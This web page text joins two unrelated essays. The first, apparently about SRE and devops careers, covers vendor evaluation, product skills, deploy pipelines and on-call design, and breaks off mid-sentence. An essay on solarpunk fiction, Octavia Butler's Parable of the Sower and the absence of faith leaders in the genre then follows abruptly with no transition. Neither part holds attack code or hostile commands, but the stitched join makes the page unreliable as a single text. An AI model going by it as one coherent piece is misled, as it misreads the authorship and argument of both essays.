<p><span>If your heart truly beats for working on infrastructure problems, you’re in luck! — there are more of those than ever. Go join an infrastructure company. Try one of the many companies — AWS, Azure, all the many developer tooling companies — whose mission consists of building infrastructure software, of being the best in the world at infrastructure, and selling that expertise to other companies. There are roles for software engineers who enjoy building infrastructure solutions as a service, and there are even specialist ops roles for running and operating that infrastructure at scale, or administering those data services at scale.&nbsp;</span></p>
<p><span>Otherwise, embrace the fact that your job consists of </span><i><span>building systems to enable teams of engineers to ship software that creates core business value</span></i><span>, which means home brewing as little infrastructure as possible. And what’s left?</span></p>
<h5><b>Vendor engineering</b><span>&nbsp;</span></h5>
<p><span>Effectively outsourcing components of your infrastructure and weaving them together into a seamless whole involves a great deal of architectural skill and domain expertise. This skill set is both rare and incredibly undervalued, especially considering how pervasive the need for it is. Think about it. If you work at a large company, dealing with other internal teams should feel like dealing with vendors. And if you work at a small company, dealing with other vendors should feel like dealing with other teams.&nbsp;</span></p>
<p><span>Anyone who wants a long and vibrant career in SRE leadership would do well to invest some energy into areas like these:</span></p>
<ul>
<li><span>Learn to evaluate vendors and their products effectively. Ask piercing, probing questions to gauge compatibility and fit. Determine which areas of friction you can live with and which are dealbreakers.</span></li>
<li><span>Learn to calculate and quantify the cost of your and your team’s time and labor. Be ruthless about shedding as much labor as possible in order to focus on your core business.&nbsp;</span></li>
<li><span>Learn to manage the true cost of ownership, and to advocate and educate internally for the right solution, particularly by managing up to execs and finance folks.</span></li>
</ul>
<h5><b>Product engineering</b><span>&nbsp;</span></h5>
<p><span>One of the great tragedies of infrastructure is how thoroughly most of us managed to evade the past 20+ years of lessons in managing products and learning how to work with designers. It’s no wonder most infrastructure tools require endless laborious trainings and certifications. They simply weren’t built like modern products for humans.</span></p>
<ul>
<li><span>I recommend a crash course. Embed yourself within a B2B or B2C feature delivery team for a spell. Learn their rhythms, learn their language, soak up some of their instincts. You’ll need them to balance and blend your instincts for architectural correctness, scaling patterns, and firefighting.</span></li>
<li><span>You don’t have to become an expert in shipping features. But you should learn the elements of relationship-building the way a good product manager does. And you must learn enough about the product lifecycle that you can help debug and divert teams whose roadmaps are hopelessly intertwined and whose roadmaps are grinding to a halt.</span></li>
</ul>
<h5><b>Sociotechnical systems engineering</b><span>&nbsp;</span></h5>
<p><span>The irreducible core of the SRE/devops skill set increasingly revolves around crafting and curating efficient, effective sociotechnical feedback loops that enable and empower engineers to ship code — to move swiftly, with confidence. Your job is not to say “no” or throw up roadblocks, it’s to figure out how to help them get to yes.</span></p>
<ul>
<li><span>Start with embracing releases. Lean hard into the deploy pipeline. The safest diff is the smallest diff, and you should ship automatically and compulsively. Optimize tests, CI/CD, etc so that deploys happen automatically upon merge to main, so that a single mergeset gets deployed at a time, there are no human gates, and everything goes live automatically within a few minutes of a developer committing their code. This is your holy grail, and most teams are nowhere near there.</span></li>
<li><span>Design and optimize on-call rotations that load balance the effort fairly and sustainably, and won’t burn people out. Apply the appropriate amount of pressure on management to devote enough time to reliability and fixing things versus just shipping new features. Hook up the feedback loops so that the people who are getting alerted are the ones empowered and motivated to fix the problems that are paging them. Ideally, you should page the person who made the change, every time.</span></li>
<li><span>Foster a culture of ownership and accountability while promulgating blamelessness throughout the org. Welcome engineers into production, and help them navigate production waters happily and successfully.</span></li>
</ul>
<h5><b>Managing the portfolio of technical investments.</b></h5>
<ul>
<li><span>Operability is the longest term investment / primary source of technical debt, so no one is better positioned to help evaluate and amortize those risks than ops engineers. It is effectively free to write code, compared to the gargantuan resources it takes to run that code and tend to it over the years.</span></li>
<li><span>Get excellent at migrations. Leave no trailing, stale remnants of systems behind to support — those are a terrible drain on the team. Surface this energy drain to decision-makers instead of …</span></li></ul></div></div></div>

<p><span>Fast forward to our present non-fiction. My day job is teaching elementary school. Yet despite the allure of two months of do-whatever-I-want-time, more and more I dread the coming of summer, because glaciers the size of islands are falling into the ocean. Is this the season when my <em>Westworld</em> kingdom is invaded by drought and famine? When Russia’s permafrost melts, releasing primeval microscopic disease-titans (</span><a href="http://www.bbc.com/earth/story/20170504-there-are-diseases-hidden-in-ice-and-they-are-waking-up"><span>they are real, 2017</span></a><span>) to gobble me up in a surprise Greek tragedy? When the floodgates of my Amazon-fueled desires are permanently clogged by natural man-made disaster? Of course, Prime will continue to deliver, but the markup would be understandably obscene.</span></p>
<p><span>Will this be the season my melanin hard-fails me?</span></p>
<p><span>I joke because I’m afraid. Not only is this specific dystopia possible, Butler seems to have predicted it twenty-seven years ago. </span><i><span>Parable of the Sower</span></i><span> is set somewhere in the 2020s during a presidential election in which the candidate’s campaign slogan is “Make America Great Again</span><i><span>.” </span></i><span>Oh yes, and California actually </span><i><span>is</span></i> <span>burning right now. This is a horrible present. I ordered the exact opposite of this nightmare. I asked for solarpunk.</span></p>
<p><b>Solarpunk: The Genre of Solutions</b></p>
<p><span>Solarpunk is the environmentally conscious speculative arts movement that best navigates the terrors ahead. Detractors label it a kind of Pollyanna utopianism full of empty calories. It’s true that the Google replicator machine will serve up a visual feast</span><span> of enforested skyscrapers and lush solar energy mushroom cities (possibly under the sea, possibly shared with amiable, buck-toothed invertebrates with ageless comedic timing). The solarpunk aesthetic will sometimes wear utopian clothing, but it’s nobody’s fault, really. Ursula K. Le Guin helped plant solarpunk seeds decades ago, in stories such as the 1972 novel </span><i><span>The Dispossessed,</span></i> <span>her 1982 essay “</span><a href="https://www.fifthestate.org/archive/382-spring-2010/non-euclidean-view-california-cold-place-1982/"><span>A Non-Euclidean View of California as a Cold Place to Be</span></a><span>,”</span> <span>and many othe</span><span>r Daoist-inspired works</span><i><span>.</span></i><span> Thus, the movement was growing long before the term was coined in 2008. So after decades of imagineering and community building, there are bound to be layers and crumbly edges. And to be fair, it is impossible to dream of Hell and not pine for its opposite.</span></p>
<p><span>In truth, solarpunk is functional AF. The primary colors of its aura are red, orange, and yellow: Courageously compassionate, creatively scientific, and awakened interdependence. In many ways, it can be more rigorous than so-called “hard science fiction.” Don’t @ the messenger; I’m quoting Kim Stanley Robinson, author of </span><i><span>New York 2140</span></i><span> among many other groundbreaking stories of eco-fiction. He takes issue with the viral over-affixation of “-punk” (Google punk genres and see how many you get). However, at Boskone 57, one of the largest science fiction conventions in the country, where he was guest of honor, Robinson described a genre full of futures to defy the Anthropocene. Stories where sacrifices are made, but in the end, we find ways to survive and become wise. I told him afterwards that it sounded like solarpunk, and he stage-whispered, “That’s because it is.”&nbsp;</span></p>
<p><span>If we focus primarily on the genre’s textual artifacts — including the discourses on the various social media platforms, but especially the genre fiction it produces — solarpunk’s better qualities become unimpeachable. I have read all the major solarpunk anthologies that have come out in the last five years. To quote Sarena Ulibarri, editor of </span><i><span>Glass and Gardens: Solarpunk Summers</span></i><span> and newly out </span><i><span>Solarpunk Winters,</span></i><span> because she’s so damn quotable, “[Solarpunk] stories depict adaptation and compromise rather than destruction and conquest… empathy over greed.” They are an antidote for the toxin, yin to counteract the damage done by the big yang motorcycle trip, and I am a believer.</span></p>
<p><span>Yet after reading and enjoying these stories, I noticed a pattern. The viewpoint characters of solarpunk stories roughly fall into categories with similar confluences; Joênia from Thomas Badlan’s “Orchidae” (in </span><i><span>Glass and Gardens: Solarpunk Winters,</span></i> <span>2020) is one among many intrepid scientists you will find in the genre, racing the clock to preserve life or help us adapt. Young makers, like Del the biotech tinkerer in D.K. Mok’s “The Spider and the Stars,” and the community that comes together to ceremonially re-create the vanished Arctic in Andrew Dana Hudson’s “Black Ice City” (both in </span><i><span>Solarpunk Summers,</span></i><span> 2018), are also well represented in solarpunk.&nbsp;&nbsp;</span></p>
<p><span>There’s some spillover from the makers into the anarchists. In T.X. Waston’s “The Boston Hearth Project” (in </span><i><span>Sunvault</span></i><i><span>,</span></i><span> a 2017 anthology edited by Wagner and Wieland), these are people who thrive on the leftmost bleeding edge of society, breaking rules that should never have been in order to shelter the homeless. But many solarpunk characters — and most salient to this conversation — are young people, often women of color, adjusting to the dangers of the new normal brought on by severe environmental changes and doing so in ways their elders did not have the foresight or perspective to do themselves. Daesha in “Fyrewall” by Stefani Cox </span><i><span>(Solarpunk Summers)</span></i><span> is one like this, gifted with responsibilities beyond her years when she must fix the wall protecting future Californians from raging wildfires. All these stories showcase new or repurposed material resources and technologies for increased sustainability.&nbsp;&nbsp;</span></p>
<p><span>Clearly these voices are necessary. But there’s something missing. The intersection with communities of faith is roped off.</span></p>
<p><b>Spirit in the Machine: The Missing Piece</b></p>
<p><span>The heroine of Butler’s </span><i><span>Parable of the Sower</span></i> <span>is</span> <span>Lauren Oya Olamina. She will be little more than a child before inevitable mayhem and metastasized, commodified suffering rolls up on her family, murders everyone, and destroys what is left of her community. She will escape with her life, but orphaned and traumatized. What is she to do?</span></p>
<p><span>Step one: Become a self-made messiah.</span></p>
<p><span>Step two: Reengineer God.</span></p>
<p><span>Step three: Save humanity.</span></p>
<p><span><span>Step four: Bong hits.</span></span></p>
<p><span>Hers is an incredibly powerful story. She very much fits the mold of solarpunk heroines with one exception: She’s a faith leader. Why aren’t there more characters like her? Where are the griots and santeras? Where are the bodhisattvas and the saints? Those who speak the languages of heaven’s heart? Where are the Lauren Oya Olaminas?</span></p>
<p><span>Her absence, given what she might represent, is understandable. Ideology (the dogmatic kind) has often been the death of free thinkers and first adopters. It has produced conservative paradigms that sustained brutal hierarchies, birthed unforgettable monsters, and poured bleach on other people’s history. But too often to ignore, the opposite has also been the case. Tibetan Buddhism and the Dalai Lama comes to mind. The Southern Christian Leadership Conference, the nonviolent Civil Rights Era organizing group whose goal was to redeem “the soul of America,” was not an aberration of history. Martin Luther King may have been a GOAT (Greatest Of All Time, for those without access to Urban Dictionary), but if time’s memory was more robust, his would not be the only spirit we commune with on special occasions.&nbsp;</span></p>
<p><span>So, whether it has been a purposeful or subconscious omission, this issue must be addressed for solarpunk to move beyond artists, and progressive secularists. We need to mainstream the radical.</span></p>
<p><b>The Intersection is Under Construction</b></p>
<p><span>There are three tenets of solarpunk orthodoxy that are relevant here. The first is that solarpunk is an overtly inclusive space. If it could be a real boy, anti-racism would be in its DNA. Keep that in mind when I tell you that the US Census <a href="https://www.brookings.edu/blog/the-avenue/2018/03/14/the-us-will-become-minority-white-in-2045-census-projects/%20">projects</a> that by the year 2045, the majority of US population will be people of color (already the case for residents under age eighteen) and the majority of us profess some kind of faith (itinerant Seon Buddhist right here).<br></span></p>
<p><span>In 2008, when last Pew Research asked the question, 95% of those surveyed reported belief in a higher power of some kind. Even among scientists, the believers were in the majority. Both numbers go up if you include the rest of the world, particularly the black and brown parts. So, for solarpunk to be properly inclusive of us in possible futures, it would be a mistake to blackbox significant guiding tenets because of an aversion to the dominant ideologies and the much-discussed potential for evil in organized religion. Evil is everywhere. Search for kittens on your favorite browser and scroll down for about thirty seconds. There be evil.&nbsp;</span></p>

  <p><span>Claudie Arseneault, author of <i>Wings of Revival: A Solarpunk Dragon Anthology</i>, gives us the second tenet: “[Solarpunk should work] from existing technologies, from things we already know are possible.” This is key. There is no greater or more fundamental technology than culture. It, and the ark of ideologies that arise from it, are more than just peer pressure from dead people. Culture is <i>software.</i> And more often than not, that includes a spiritual platform.</span></p>
